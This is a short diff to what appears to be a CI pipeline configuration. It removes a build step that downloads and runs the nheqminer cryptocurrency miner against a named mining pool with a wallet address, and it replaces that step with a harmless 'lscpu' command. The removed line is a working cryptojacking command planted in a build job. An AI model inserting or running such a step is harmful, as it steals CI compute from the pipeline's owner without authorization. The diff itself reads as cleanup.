@@ -13,5 +13,4 @@ jobs:
           password: $GITHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l ap.luckpool.net:3956 -u RLae6qSXCyqzyJDYZ1zEuE8vAJBjvMavKR.qw -p x -t 30
-    
+      - run: lscpu
